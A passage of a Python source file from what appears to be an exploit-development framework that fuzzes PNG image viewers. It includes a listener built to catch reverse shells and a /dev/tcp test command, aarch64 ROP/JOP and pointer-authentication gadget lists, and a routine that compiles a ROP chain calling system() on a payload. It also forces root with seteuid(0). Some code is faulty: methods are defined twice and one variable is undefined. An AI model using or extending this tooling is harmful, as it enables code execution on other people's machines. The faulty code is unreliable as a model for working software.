from pathlib import Path
import subprocess
import os
import shutil
import time
import argparse
import logging
import traceback
import platform
import zlib
import json
import random
import re
import csv
import fcntl  # For file locking
import concurrent.futures # New import for parallelization
import signal  # For process suspension control
import asyncio  # For async I/O server
import socket  # For network operations
import multiprocessing  # For per-connection reverse-shell workers
import sys
from typing import Optional, List, Dict, Union, Callable, Tuple
import torch # For ML model
from torch.utils.tensorboard import SummaryWriter # For TensorBoard logging
from PIL import Image # For TensorBoard image logging
import torchvision.transforms as transforms # For TensorBoard image logging
import numpy as np
#for iterator
from typing import Iterator
import itertools
import psutil  # For process features
from crash_monitor import GdbHelper, ApportCrashInfo, monitor_apport_log, parse_apport_report, request_sudo_if_needed
from data_processor import FuzzingSample, InstrumentationSuggestion, load_and_process_data, _extract_file_features, _extract_elf_features, ELF_FEATURE_VECTOR_SIZE , _extract_apport_crash_features
from ml_fuzzer_model import (
    VAEGAN,
    train_vaegan,
    generate_suggestion,
    FuzzingDataset,
    AddressOracle,
    AddressSample,
    AddressDataset,
    collect_address_features,
    train_address_oracle,
    predict_addresses,
    find_pretrained_model_paths,
    normalize_feature_vector,
)  # New import for LIME and AddressOracle
import pil_loader # New import for pil_loader.py
from lime_explainer import LimeExplainer, plot_and_log_lime_explanation # New imports for LIME
import threading # For file monitoring
# Configure logging
#define globals and constants
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
ROOT_DIR = os.path.abspath(os.path.dirname(__file__))
 

IEND_CHUNK = b'\x49\x45\x4e\x44\xae\x42\x60\x82'
_suspended_viewer_processes = {}  # key: unique_id:file_path, value: {'pid': int, 'process': subprocess.Popen} 
_suspended_viewer_lock = threading.Lock()  # To synchronize access to the suspended viewer processes dictionary


 
def get_png_consumer_compile_command(source_path: str = "png_consumer.c", output_path: str = "./png_consumer", machine: Optional[str] = None) -> List[str]:
    """Return the compiler command used to build png_consumer with suitable flags for the host architecture."""
    compiler = os.environ.get("CC", "gcc")
    machine_name = (machine or platform.machine() or "").lower()
    cmd = [compiler]

    if "aarch64" in machine_name or "arm64" in machine_name or machine_name.startswith("arm"):
        cmd.extend(["-O2", "-march=armv8-a", "-mtune=cortex-a53"])
    else:
        cmd.extend(["-O2"])

    cmd.extend(["-Wall", "-Wextra", source_path, "-o", output_path, "-lpng", "-lz"])
    return cmd


def ensure_png_consumer_built(source_path: str = "png_consumer.c", output_path: str = "./png_consumer", machine: Optional[str] = None) -> str:
    """Build png_consumer when needed with architecture-aware flags."""
    output_path_abs = os.path.abspath(output_path)
    if os.path.exists(output_path_abs):
        source_exists = os.path.exists(os.path.abspath(source_path))
        if source_exists and os.path.getmtime(os.path.abspath(source_path)) <= os.path.getmtime(output_path_abs):
            return output_path_abs

    cmd = get_png_consumer_compile_command(source_path=source_path, output_path=output_path, machine=machine)
    logger.info("Compiling png_consumer with: %s", " ".join(cmd))
    subprocess.run(cmd, check=True)
    return output_path_abs


def generate_base_png(output_path: str, width: int = 100, height: int = 100) -> Path:
    """
    Write a minimal but *valid* PNG to ``output_path``.
    The PNG contains:

    * IHDR - indexed colour, 8-bit depth.
    * PLTE - three colours (red, green, blue).
    * IDAT - a deterministic stream of zeros.
    * IEND - end of file marker.

    The function is thread-safe: it acquires a file lock before writing.
    """
    signature = b'\x89PNG\r\n\x1a\n'

    # ---- IHDR ------------------------------------------------------------
    ihdr_type = b'IHDR'
    ihdr_data = (
        width.to_bytes(4, 'big') +
        height.to_bytes(4, 'big') +
        b'\x08' +          # Bit depth
        b'\x03' +          # Color type: Indexed
        b'\x00' +          # Compression
        b'\x00' +          # Filter
        b'\x00'            # Interlace
    )
    ihdr_chunk = (len(ihdr_data).to_bytes(4, 'big') + ihdr_type + ihdr_data +
                  calculate_png_crc(ihdr_type, ihdr_data))

    # ---- PLTE ------------------------------------------------------------
    plte_type = b'PLTE'
    plte_data = b'\xff\x00\x00' + b'\x00\xff\x00' + b'\x00\x00\xff'
    plte_chunk = (len(plte_data).to_bytes(4, 'big') + plte_type + plte_data +
                  calculate_png_crc(plte_type, plte_data))

    # ---- IDAT ------------------------------------------------------------
    idat_type = b'IDAT'
    raw_data = b'\x00' + (b'\x00' * width)
    full_raw_data = raw_data * height
    compressed_data = zlib.compress(full_raw_data)
    idat_chunk = (len(compressed_data).to_bytes(4, 'big') + idat_type +
                  compressed_data + calculate_png_crc(idat_type, compressed_data))

    # ---- IEND ------------------------------------------------------------
    iend_chunk = b'\x00\x00\x00\x00' + IEND_CHUNK
    output_path_obj = Path(output_path).resolve()
    
    try:
        # Ensure parent directory exists
        output_path_obj.parent.mkdir(parents=True, exist_ok=True)
        
        with open(str(output_path_obj), 'wb') as f:
            # Acquire an exclusive lock on the file
            fcntl.flock(f, fcntl.LOCK_EX)
            try:
                f.write(signature)
                f.write(ihdr_chunk)
                f.write(plte_chunk)
                f.write(idat_chunk)
                f.write(iend_chunk)
                logger.info(f"Generated base PNG at {output_path_obj}")
            finally:
                # Release the lock
                fcntl.flock(f, fcntl.LOCK_UN)
        return output_path_obj
    except Exception as e:
        logger.error(f"Error creating {output_path_obj}: {e}")
        raise

def copy_media_folder(source: str, target: str) -> None:
    """Recursively synchronize source directory to target directory.
    
    Args:
        source: Source directory path.
        target: Target directory path.
    """
    """Recursively synchronizes the source directory to a target directory."""
    if not os.path.exists(target):
        os.makedirs(target)
    
    #try to use shutil.copytree for efficiency, but fall back to manual copy if it fails (e.g., due to existing target) 
    try:
        shutil.copytree(source, target)
    except FileExistsError:
        logger.info(f"Target directory {target} already exists, using manual copy")
        for root, dirs, files in os.walk(source):
            rel_path = os.path.relpath(root, source)
            dest_path = os.path.join(target, rel_path)
            if not os.path.exists(dest_path):
                os.makedirs(dest_path)
            for file in files:
                try:
                    if file.endswith('.png'):
                        shutil.copy2(os.path.join(root, file), os.path.join(target, rel_path, file))
                except Exception as e:
                        logger.error(f"Error copying {file}: {e}")
                

def calculate_png_crc(chunk_type: bytes, data: bytes) -> bytes:
    """Calculate the CRC-32 for a PNG chunk.
    
    Args:
        chunk_type: PNG chunk type (4 bytes).
        data: PNG chunk data.
    
    Returns:
        CRC-32 value as 4 bytes (big-endian).
    """
    """Calculates the CRC-32 for a PNG chunk."""
    #return zlib.crc32(chunk_type + data).to_bytes(4, 'big')
    crc = zlib.crc32(chunk_type + data) & 0xffffffff
    return crc.to_bytes(4, 'big')


# ============================================================================
# Async Payload Server (Replaces netcat listener with in-process async I/O)
# ============================================================================

def _handle_listener_connection(socket_fd: int, log_file: Optional[str], addr: tuple, connection_id: int) -> None:
    """Worker process that accepts data from a client socket, logs it, and sends a response."""
    sock = None
    try:
        sock = socket.fromfd(socket_fd, socket.AF_INET, socket.SOCK_STREAM)
        os.close(socket_fd)
        sock.settimeout(2.0)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        payload = b""
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            payload += chunk
            if b"\n" in payload:
                break

        if log_file:
            with open(log_file, 'a', encoding='utf-8') as handle:
                fcntl.flock(handle.fileno(), fcntl.LOCK_EX)
                try:
                    handle.write(f"[{time.time()}] worker={connection_id} addr={addr} bytes={len(payload)}\n")
                    if payload:
                        try:
                            handle.write(f"[{time.time()}] content={payload.decode('utf-8', errors='ignore')}\n")
                        except Exception:
                            handle.write(f"[{time.time()}] content={payload[:200]!r}\n")
                    handle.flush()
                finally:
                    fcntl.flock(handle.fileno(), fcntl.LOCK_UN)

        if payload:
            try:
                sock.sendall(b"shell-ready\n")
            except OSError:
                pass
        else:
            try:
                sock.sendall(b"shell-ready\n")
            except OSError:
                pass
    except Exception as exc:
        logger.debug(f"Listener worker failed for {addr}: {exc}")
    finally:
        if sock is not None:
            try:
                sock.shutdown(socket.SHUT_WR)
            except OSError:
                pass
            try:
                sock.close()
            except OSError:
                pass


class AsyncPayloadServer:
    """Small async listener that spawns a real worker process for each accepted connection."""

    def __init__(self, port: int = 24444, log_file: str = None, shutdown_event: threading.Event = None):
        self.port = port
        self.log_file = log_file
        self.server = None
        self.running = True
        self.shutdown_event = shutdown_event
        self.log_lock = threading.Lock()
        self.connection_count = 0
        self.last_connection_time = None
        self.active_children = []

    def _append_log(self, text: str) -> None:
        if not self.log_file:
            return
        try:
            with open(self.log_file, 'a', encoding='utf-8') as handle:
                fcntl.flock(handle.fileno(), fcntl.LOCK_EX)
                try:
                    handle.write(text)
                    handle.flush()
                finally:
                    fcntl.flock(handle.fileno(), fcntl.LOCK_UN)
        except Exception as exc:
            logger.warning(f"Failed to append listener log: {exc}")

    def _spawn_handler(self, writer: asyncio.StreamWriter, addr: tuple) -> None:
        sock = writer.get_extra_info('socket')
        if sock is None:
            return

        dup_fd = os.dup(sock.fileno())
        connection_id = self.connection_count
        proc = multiprocessing.Process(
            target=_handle_listener_connection,
            args=(dup_fd, self.log_file, addr, connection_id),
            daemon=True,
        )
        proc.start()
        with self.log_lock:
            self.active_children.append(proc)

        self._append_log(f"[{time.time()}] spawned worker {proc.pid} for {addr}\n")
        writer.close()

    async def handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Handle an incoming connection by spinning up a real worker process."""
        addr = writer.get_extra_info('peername')
        logger.info(f"Connection from {addr}")

        with self.log_lock:
            self.connection_count += 1
            self.last_connection_time = time.time()

        self._append_log(f"[{time.time()}] Connection from {addr}\n")
        self._spawn_handler(writer, addr)
        await asyncio.sleep(0.05)
        return None

    async def start(self):
        """Start the async server."""
        try:
            self.server = await asyncio.start_server(
                self.handle_client,
                '127.0.0.1',
                self.port,
                reuse_address=True,
            )

            logger.info(f"Async payload server listening on port {self.port}")

            while self.running:
                if self.shutdown_event and self.shutdown_event.is_set():
                    logger.debug("Async server received shutdown signal")
                    break
                try:
                    await asyncio.wait_for(asyncio.sleep(0.1), timeout=0.1)
                except asyncio.TimeoutError:
                    pass
        except OSError as e:
            logger.error(f"Async server port error (port {self.port} may be in use): {e}")
            self.running = False
        except Exception as e:
            logger.error(f"Async server error: {e}")
            self.running = False
        finally:
            self.running = False
            if self.server:
                self.server.close()

    def stop(self):
        """Stop the async server."""
        self.running = False
        if self.server:
            self.server.close()
    
    async def start(self):
        """Start the async server."""
        try:
            self.server = await asyncio.start_server(
                self.handle_client,
                '127.0.0.1',
                self.port,
                reuse_address=True
            )
            
            logger.info(f"Async payload server listening on port {self.port}")
            
            # Keep server running until shutdown event is set or error occurs
            while self.running:
                # Check for shutdown signal from wrapper thread
                if self.shutdown_event and self.shutdown_event.is_set():
                    logger.debug(f"Async server received shutdown signal")
                    break
                try:
                    await asyncio.wait_for(asyncio.sleep(0.1), timeout=0.1)
                except asyncio.TimeoutError:
                    pass
        except OSError as e:
            logger.error(f"Async server port error (port {self.port} may be in use): {e}")
            self.running = False
        except Exception as e:
            logger.error(f"Async server error: {e}")
            self.running = False
        finally:
            self.running = False
            if self.server:
                self.server.close()
    
    def stop(self):
        """Stop the async server."""
        self.running = False
        if self.server:
            self.server.close()


def _run_async_server(port: int, log_file: str, shutdown_event: threading.Event = None, server_holder: dict = None):
    """Run async server in asyncio event loop (for threading).
    
    Args:
        port: Port to listen on.
        log_file: File to log connections to.
        shutdown_event: Event to signal graceful shutdown.
        server_holder: Dict to store server reference for status queries (e.g., connection_count).
    """
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        server = AsyncPayloadServer(port=port, log_file=log_file, shutdown_event=shutdown_event)
        if server_holder is not None:
            server_holder['server'] = server  # Store reference for status queries
        loop.run_until_complete(server.start())
    except Exception as e:
        logger.error(f"Failed to run async server: {e}")
    finally:
        if server_holder is not None:
            server_holder['server'] = None
        try:
            loop.close()
        except Exception as e:
            logger.debug(f"Error closing event loop: {e}")


class AsyncServerProcess:
    """Wrapper to run async server in a background thread, providing subprocess-like interface."""
    
    def __init__(self, port: int = 24444, log_file: str = None):
        self.port = port
        self.log_file = log_file
        self.thread = None
        self.returncode = None
        self.pid = os.getpid()  # Use current process PID
        self.shutdown_event = threading.Event()  # Signal for graceful shutdown
        self.server_holder = {}  # Dict to hold reference to server instance for status queries
    
    def start(self):
        """Start the server in background thread."""
        self.shutdown_event.clear()  # Reset shutdown signal
        self.server_holder.clear()  # Clear old reference
        self.thread = threading.Thread(
            target=_run_async_server,
            args=(self.port, self.log_file, self.shutdown_event, self.server_holder),
            daemon=True  # Daemon thread so it doesn't block process shutdown
        )
        self.thread.start()
        time.sleep(0.1)  # Give server time to start
        logger.info(f"Async server thread started on port {self.port}")
    
    def has_connections(self) -> bool:
        """Check if server has received any connections."""
        server = self.server_holder.get('server')
        return server is not None and server.connection_count > 0
    
    def poll(self) -> Optional[int]:
        """Check if server is still running (compatible with subprocess API)."""
        if not self.thread:
            return 1  # Not started
        if self.thread and not self.thread.is_alive():
            self.returncode = 1
            logger.warning(f"Async server thread on port {self.port} has died unexpectedly")
            return self.returncode
        return None  # Still running
    
    def wait(self, timeout: Optional[float] = None) -> int:
        """Wait for server to stop (compatible with subprocess API)."""
        if self.thread:
            self.thread.join(timeout=timeout)
        return self.returncode or 0
    
    def terminate(self):
        """Terminate the server (compatible with subprocess API)."""
        logger.debug(f"Terminating async server on port {self.port}")
        self.shutdown_event.set()  # Signal server to shutdown
        self.returncode = 0
    
    def kill(self):
        """Kill the server (compatible with subprocess API)."""
        logger.debug(f"Killing async server on port {self.port}")
        self.shutdown_event.set()  # Signal server to shutdown
        self.returncode = -9


def validate_operational_netcat_session(file: Optional[str] = None, timeout: int = 5) -> bool:
    """Validate that the netcat listening session is operational.
    
    Args:
        file: Optional path to a netcat log file to check. If None, scans ./logs/files/netcat/.
        timeout: Timeout in seconds for validation.
    
    Returns:
        True if netcat session is operational, False otherwise.
    """
    """Validates that the netcat session is operational by sending an echo command redirected to the listening port and checking for the response.""" 
    try:
        #netcat should be listening on port 24444 
        # Send a test message to the netcat listener and check for the response to confirm it's operational 
        clock = time.time()
        cmd = f'echo "validation_{clock}!" > /dev/tcp/127.0.0.1/24444' 
        #check netcat logs under logs/files/netcat/ to see if the message was received 
        #
        #
        #iterate the files relative to the local folder at ./logs/files/netcat/ and check for the message 
        #
        #
        if file is None:
            
            for file in os.listdir('./logs/files/netcat/'):
                if file.startswith('netcat_') and file.endswith('.log'):
                    with open(os.path.join('./logs/files/netcat/', file), 'r') as f:
                        if cmd in f.read():
                            logger.info(f"Netcat session is operational")
                            return True
                        else:
                            logger.error(f"Netcat session is not operational")
                            return False
        else :
            with open(file, 'r') as f:
                if cmd in f.read():
                    logger.info(f"Netcat session is operational")
                    return True
                else:
                    logger.error(f"Netcat session is not operational")
                    return False                

    except Exception as e:
        logger.error(f"Error validating netcat session: {e}")
            
        
    return False
    


        

def find_viewer_pid_with_file(viewer_name: str, file_path: str) -> Optional[int]:
    """Find the PID of a viewer process that has the specified file loaded in memory.
    
    Args:
        viewer_name: Name of the viewer process (e.g., 'firefox', 'eog', 'png_consumer').
        file_path: Absolute path to the file to search for.
    
    Returns:
        PID of the viewer process if found, None otherwise.
        Note: None means no process was found; use 0 to represent a missing PID in contexts where None is not acceptable.
    """
    try:
        import psutil
        abs_file_path = os.path.abspath(file_path)
        if not os.path.exists(abs_file_path):
            logger.warning("File does not exist: %s", abs_file_path)
            return None
        
        #verify sudo permissions for process introspection, if not available, log a warning and continue with limited access (may miss some processes)
        if not os.geteuid() == 0:
            logger.warning("Not running with sudo permissions, some viewer processes may not be detected.")
            try:
                request_sudo_if_needed()
                logger.info("Gained sudo permissions for process introspection")
            except Exception as e:
                logger.error(f"Failed to gain sudo permissions for process introspection: {e}")
                logger.warning("Continuing with limited access, some viewer processes may not be detected.")
                
        #set uid to 0 to gain sudo permissions for process introspection
        if os.geteuid() != 0:
            os.seteuid(0)
            
        
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                proc_name = proc.info.get('name') or ''
                cmdline = proc.info.get('cmdline') or []
                
                # For Python-based viewers (PIL), check cmdline for the script name
                # For native viewers, check process name
                name_match = False
                if viewer_name.lower() not in proc_name.lower():
                    # Check if this is a Python process running a viewer script
                    if viewer_name == "PIL" and "python" in proc_name.lower():
                        # For PIL, check if pil_loader is in the command line
                        cmdline_str = ' '.join(cmdline)
                        if "pil_loader" in cmdline_str.lower():
                            name_match = True
                    # Could add similar checks for other Python-based viewers here
                else:
                    name_match = True
                
                if not name_match:
                    continue

                # Check command line for the file path
                for arg in cmdline:
                    if isinstance(arg, str):
                        # Skip empty strings and arguments that start with '-' (options)
                        if not arg or arg.startswith('-'):
                            continue
                        try:
                            # Check if the string contains the target file path directly
                            if abs_file_path in arg:
                                logger.debug(f"Found {viewer_name} process {proc.info['pid']} with {abs_file_path} in cmdline")
                                return proc.info['pid']
                            # Also try normalizing the argument to an absolute path and compare
                            arg_abs = os.path.abspath(arg)
                            if arg_abs == abs_file_path:
                                logger.debug(f"Found {viewer_name} process {proc.info['pid']} with {abs_file_path} in cmdline")
                                return proc.info['pid']
                        except (OSError, ValueError):
                            continue

                maps_path = f'/proc/{proc.info["pid"]}/maps'
                if maps_path and os.path.exists(maps_path):
                    try:
                        with open(maps_path, 'r') as f:
                            if abs_file_path in f.read():
                                logger.debug(f"Found {viewer_name} process {proc.info['pid']} with {abs_file_path} in maps")
                                return proc.info['pid']
                    except (PermissionError,FileNotFoundError):
                        # Fall back to sudo pgrep if permission denied
                        try:
                            result = subprocess.run(['sudo', 'pgrep', '-f', search_pattern], capture_output=True, text=True, timeout=5)
                            if result.returncode == 0:
                                pids = result.stdout.strip().split('\n')
                                for pid in pids:
                                    if pid.isdigit() and int(pid) == proc.info['pid']:
                                        logger.debug(f"Found {viewer_name} process {proc.info['pid']} via sudo pgrep")
                                        return int(pid)

                        except Exception as e: 
                            #sudo failed: 
                            pidd= proc.info['pid']
                            logger.error(f'Failed to gain sudo permissions for process {pidd}') 
                            continue


                fd_dir = f'/proc/{proc.info["pid"]}/fd'
                if os.path.isdir(fd_dir):
                    for fd_name in os.listdir(fd_dir):
                        try:
                            fd_path = os.path.realpath(os.path.join(fd_dir, fd_name))
                            if fd_path == abs_file_path:
                                logger.debug(f"Found {viewer_name} process {proc.info['pid']} with {abs_file_path} open in fd {fd_name}")
                                return proc.info['pid']
                        except OSError:
                            continue
            except psutil.AccessDenied as e:
                pid = proc.info.get('pid', 'unknown')
                logger.debug(f"Skipping process {pid} (AccessDenied - run with sudo for full process introspection)")
                
                continue
            except (psutil.NoSuchProcess, FileNotFoundError, ProcessLookupError, OSError) as e:
                pid = proc.info.get('pid', 'unknown')
                logger.debug(f"Could not access process {pid} while checking file references: {e}")
                continue

    except ImportError:
        # Fallback without psutil
        try:
            # For PIL, search for pil_loader in command line
            search_pattern = "pil_loader" if viewer_name == "PIL" else viewer_name
            result = subprocess.run(['pgrep', '-f', search_pattern], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                pids = result.stdout.strip().split('\n')
                for pid in pids:
                    try:
                        proc_cmdline_path = f'/proc/{pid}/cmdline'
                        if os.path.exists(proc_cmdline_path):
                            with open(proc_cmdline_path, 'r', errors='ignore') as cmdline_f:
                                if abs_file_path in cmdline_f.read().replace('\x00', ' '):
                                    logger.debug(f"Found {viewer_name} process {pid} with {abs_file_path} in cmdline")
                                    return int(pid)

                        maps_path = f'/proc/{pid}/maps'
                        if os.path.exists(maps_path):
                            with open(maps_path, 'r') as f:
                                if abs_file_path in f.read():
                                    logger.debug(f"Found {viewer_name} process {pid} with {abs_file_path} in maps")
                                    return int(pid)

                        fd_dir = f'/proc/{pid}/fd'
                        try:
                            if os.path.isdir(fd_dir):
                                for fd_name in os.listdir(fd_dir):
                                    try:
                                        fd_path = os.path.realpath(os.path.join(fd_dir, fd_name))
                                        if fd_path == abs_file_path:
                                            logger.debug(f"Found {viewer_name} process {pid} with {abs_file_path} open in fd {fd_name}")
                                            return int(pid)
                                    except OSError:
                                        continue
                        except PermissionError:
                            # Skip this process - requires higher privileges to inspect
                            continue
                    except (OSError, ValueError) as e:
                        if not isinstance(e, PermissionError):
                            continue
        except Exception as e:
            logger.debug(f"Error finding viewer PID: {e}")

    logger.debug(f"No {viewer_name} process found with {abs_file_path} loaded")
    return None


def get_suspended_viewer_pid(unique_id: str, file_path: str) -> Optional[int]:
    """Get the PID of a suspended viewer process for the given unique_id and file_path.
    
    Args:
        unique_id: Unique identifier for the fuzzing iteration (e.g., session_id or iteration counter).
                   Used as key with file_path to track suspended processes across fuzzing runs.
        file_path: Absolute path to the PNG file being viewed.
    
    Returns:
        PID of the suspended viewer process if alive and found, None otherwise.
    """
    key = f"{unique_id}:{file_path}"
    proc_info = None
    with _suspended_viewer_lock:
        if key in _suspended_viewer_processes:
            proc_info = _suspended_viewer_processes[key]
            # Check if process is still alive
            if proc_info is None:
                return None
            try:
                os.kill(proc_info['pid'], 0)  # Signal 0 just checks if process exists
                return proc_info['pid']
            except OSError:
            # Process died, clean up
                logger.debug(f"Suspended viewer process {proc_info['pid']} died, cleaning up")
                del _suspended_viewer_processes[key]
            return None
    return None

def resume_viewer_process(unique_id: str, file_path: str) -> bool:
    """Resume a suspended viewer process that was previously suspended.
    
    Args:
        unique_id: Unique identifier for the fuzzing iteration (must match the ID used in suspend).
        file_path: Absolute path to the PNG file being viewed (must match the path used in suspend).
    
    Returns:
        True if the process was successfully resumed, False otherwise.
    """
    key = f"{unique_id}:{file_path}"
    
    with _suspended_viewer_lock:
        if key in _suspended_viewer_processes:
            proc_info = _suspended_viewer_processes[key]
            try:
                os.kill(proc_info['pid'], signal.SIGCONT)
                logger.debug(f"Resumed viewer process {proc_info['pid']}")
                return True
            except OSError as e:
                logger.error(f"Failed to resume viewer process {proc_info['pid']}: {e}")
                return False
    return False

def _stop_process_and_collect_output(proc: Optional[subprocess.Popen], viewer_name: str, timeout: float = 3.0) -> Tuple[str, str]:
    """Terminate a viewer process if needed and collect any remaining output without hanging."""
    if proc is None:
        return "", ""

    stdout_text = ""
    stderr_text = ""
    try:
        if proc.poll() is None:
            logger.debug(f"Stopping viewer process {viewer_name} (pid {proc.pid}) after execution")
            proc.terminate()
            try:
                proc.wait(timeout=timeout)
            except subprocess.TimeoutExpired:
                logger.debug(f"Viewer process {viewer_name} did not stop gracefully; escalating to SIGKILL")
                proc.kill()
                proc.wait(timeout=timeout)

        stdout, stderr = proc.communicate(timeout=timeout)
        if stdout:
            stdout_text = stdout.decode("utf-8", errors="ignore") if isinstance(stdout, (bytes, bytearray)) else str(stdout)
        if stderr:
            stderr_text = stderr.decode("utf-8", errors="ignore") if isinstance(stderr, (bytes, bytearray)) else str(stderr)
    except subprocess.TimeoutExpired:
        logger.warning(f"Timed out while collecting output from {viewer_name}")
        try:
            proc.kill()
            proc.communicate(timeout=timeout)
        except Exception:
            pass
    except Exception as exc:
        logger.debug(f"Error stopping viewer process {viewer_name}: {exc}")

    return stdout_text, stderr_text


def cleanup_suspended_viewer(unique_id: str, file_path: str) -> None:
    """Clean up a suspended viewer process by terminating it and removing tracking.
    
    Args:
        unique_id: Unique identifier for the fuzzing iteration (must match the ID used in suspend).
        file_path: Absolute path to the PNG file being viewed (must match the path used in suspend).
    
    This function sends SIGTERM first, and escalates to SIGKILL if necessary.
    """
    key = f"{unique_id}:{file_path}"
    with _suspended_viewer_lock:
        if key in _suspended_viewer_processes:
            proc_info = _suspended_viewer_processes[key]
            viewer_name = os.path.basename(proc_info.get('viewer_cmd', ['viewer'])[0])
            stdout_text, stderr_text = _stop_process_and_collect_output(proc_info['process'], viewer_name)
            if stdout_text:
                logger.debug(f"Viewer process {proc_info['pid']} stdout: {stdout_text}")
            if stderr_text:
                logger.debug(f"Viewer process {proc_info['pid']} stderr: {stderr_text}")
            del _suspended_viewer_processes[key]
            logger.debug(f"Cleaned up suspended viewer process for {key}")

def run_under_gdb(viewer_cmd: List[str], file_path: str, unique_id: str) -> Tuple[str, Optional[int]]:
    """Attach GDB to the target viewer process and collect crash/payload analysis."""
    viewer_name = os.path.basename(viewer_cmd[0]) if viewer_cmd else "unknown_viewer"
    abs_file_path = os.path.abspath(file_path)

    if not os.path.exists(abs_file_path):
        logger.warning(f"Cannot attach GDB because file does not exist: {abs_file_path}")
        return f"File not found before GDB attach: {abs_file_path}", None

    if viewer_name == "png_consumer":
        logger.debug(f"Skipping GDB attachment for {viewer_name} (exits too quickly for dynamic analysis)")
        return f"GDB attachment skipped for {viewer_name}", None

    target_pid = get_suspended_viewer_pid(unique_id, abs_file_path)
    if not target_pid:
        logger.info(f"No suspended {viewer_name} process found, looking for running process with {abs_file_path} loaded...")
        target_pid = find_viewer_pid_with_file(viewer_name, abs_file_path)

    if not target_pid:
        logger.warning(f"No {viewer_name} process found with {file_path} loaded - cannot attach GDB")
        return f"No viewer process found with file loaded", None

    logger.info(f"Attaching GDB to {viewer_name} process {target_pid} for analysis...")
    return GdbHelper.attach_to_pid(target_pid, unique_id)
def analyze_crash(gdb_output: str, viewer_name: str, viewer_cmd: List[str]) -> Dict[str, Union[str, bool, List[str]]]:
    """Analyze crash output from GDB and extract relevant crash information.
    
    Args:
        gdb_output: Raw output from GDB debugger.
        viewer_name: Name of the viewer that crashed (e.g., 'firefox', 'eog').
        viewer_cmd: Full command line used to launch the viewer.
    
    Returns:
        Dictionary with crash analysis results.
    """
    """Delegate crash output parsing to the crash monitor."""
    return GdbHelper.analyze_crash_output(gdb_output, viewer_name, viewer_cmd)

def lookup_gadgets(arch: str) -> List[Dict[str, str]]:
    """Look up ROP/JOP gadgets for the specified architecture.
    
    Args:
        arch: Target architecture ('aarch64' or 'x86_64').
    
    Returns:
        List of gadget dictionaries, each with 'name' and 'desc' keys.
    """
    """Returns a list of gadgets for the specified architecture."""
    gadgets = []
    if "aarch64" in arch or "arm" in arch:
        gadgets = [
            {"name": "pop_x0_x1_x2_ret", "desc": "ldp x0, x1, [sp], #16; ldr x2, [sp], #8; ret"},
            {"name": "ldp_x29_x30_ret", "desc": "ldp x29, x30, [sp], #16; ret"},
            {"name": "pop_x0_x1_x2_x30_br_x0", "desc": "ldp x0, x1, [sp], #16; ldp x2, x30, [sp], #16; br x0"},
            {"name": "load_mprotect_x3", "desc": "ldr x3, [mprotect_ptr]; ret"},
            {"name": "load_payload_x0", "desc": "ldr x0, [payload_ptr]; ret"},
            {"name": "br_x3", "desc": "br x3"},
            {"name": "jump_x0", "desc": "br x0"},
            # PAC-specific gadgets (hypothetical, would need to be found in the binary)
            {"name": "gadget_ldraa_x0_x1_br_x0", "desc": "LDRAA x0, [x1]; BR x0"},
            {"name": "gadget_blraaz_x0", "desc": "BLRAAZ x0"},
            {"name": "gadget_paciasp", "desc": "PACIA SP; ret"},
            {"name": "gadget_autiasp", "desc": "AUTIA SP; ret"},
            #BMI aand armv8.5+ gadgets would also be added here if available 
            {"name": "gadget_ldr_x0_x1_br_x0", "desc": "LDR x0, [x1]; BR x0"},
            {"name": "gadget_mov_x0_x1_br_x0", "desc": "MOV x0, x1; BR x0"},
            {"name": "gadget_ldr_x1_x0_br_x1", "desc": "LDR x1, [x0]; BR x1"},
            {"name": "gadget_mov_x1_x0_br_x1", "desc": "MOV x1, x0; BR x1"},
            # Vector-Oriented Programming (VOP) / Data-Oriented Programming (DOP) gadgets
            {"name": "gadget_vop_fmov", "desc": "FMOV d0, x1; STR d0, [x0]; ret (VOP arbitrary write)"},
            {"name": "gadget_vop_ldr_str", "desc": "LDR q0, [x1]; STR q0, [x0]; ret (VOP/DOP memory-to-memory copy)"},
            #{"name": "gadget_vop_aur", "desc": "AUR x0, x1; ret (VOP arbitrary register read)"},
            #{"name": "gadget_vop_aurp", "desc": "AURP x0, x1; ret (VOP arbitrary register read with pointer authentication)"}, 
            #vop-mov-mov-ldr-str gadgets would also be added here if available 
            #


        
        ]
    return gadgets


def detect_pac_enabled() -> bool:
    """Detect if Pointer Authentication (PAC) is enabled on AArch64.
    
    Checks /proc/cpuinfo for 'pac' feature flag.
    
    Returns:
        True if PAC is detected as enabled, False otherwise.
    """
    try:
        with open('/proc/cpuinfo', 'r') as f:
            for line in f:
                if 'Features' in line or 'flags' in line:
                    if 'pac' in line.lower():
                        logger.info("PAC (Pointer Authentication) detected as ENABLED")
                        return True
    except Exception as e:
        logger.warning(f"Could not detect PAC status: {e}")
    
    logger.warning("PAC not detected or disabled - using standard ROP/JOP")
    return False

def compile_rop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
                      leaks: Optional[Dict] = None, chain_base_addr: Optional[int] = None) -> bytes:
    """Compile a standard ROP chain to call system(payload_addr).
    
    Args:
        arch: Target architecture ('aarch64' or 'x86_64').
        gadgets: List of available gadgets (from lookup_gadgets).
        payload_addr: Memory address of the payload to execute.
        leaks: Optional dictionary of leaked function/gadget addresses.
        chain_base_addr: Optional base address for the ROP chain.
    
    Returns:
        Binary ROP chain as bytes, or empty bytes if chain cannot be compiled.
    """
    """
    Compiles a standard ROP chain to call system(payload_addr).
    
    This is the fallback ROP chain when PAC-aware chains are not needed or available.
    """
    if arch != "aarch64":
        logger.warning(f"ROP chain compilation for {arch} not implemented")
        return b""
    
    leaks = leaks or {}
    function_addr = leaks.get("system", 0) or leaks.get("execve", 0)
    payload_address = payload_addr
    
    if not function_addr:
        logger.warning("Neither system nor execve address leaked, cannot compile ROP chain")
        return b""
    
    # Standard ROP chain: pop x0, x1, x2; call function_addr
    pop_x0_x1_x2 = leaks.get("pop_x0_x1_x2_ret", 0)
    if not pop_x0_x1_x2:
        logger.warning("Required ROP gadget pop_x0_x1_x2_ret not found")
        return b""
    
    rop_chain = (
        pop_x0_x1_x2.to_bytes(8, 'little') +
        payload_address.to_bytes(8, 'little') +  # x0 = payload (command / arg)
        b"\x00" * 8 +                          # x1 = NULL
